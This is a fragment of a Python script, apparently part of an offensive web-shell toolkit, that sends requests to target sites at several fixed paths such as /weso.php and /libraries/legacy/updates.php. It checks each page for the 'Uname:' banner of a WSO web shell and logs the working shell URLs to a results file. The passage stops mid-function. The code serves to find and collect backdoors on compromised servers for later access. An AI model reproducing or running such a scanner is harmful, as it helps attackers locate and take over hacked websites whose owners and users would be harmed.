def checkWso(url):
    try:
        url_http = 'http://' + code_shell.url_domain(url)

        check = requests.get(url_http + '/weso.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
            print(' -| {:<50} --> {}[Succesfully] [wso]'.format(url, fg))
            open('results/wso.txt', 'a').write(url_http + '/weso.php\n')
        else:
            print(' -| {:<50} --> {}[Failed]'.format(url_http, fr))

        check = requests.get(url_http + '/updates.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
            print(' -| {:<50} --> {}[Succesfully] [wso]'.format(url, fg))
            open('results/wso.txt', 'a').write(url_http + '/updates.php\n')

        check = requests.get(url_http + '/libraries/legacy/updates.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
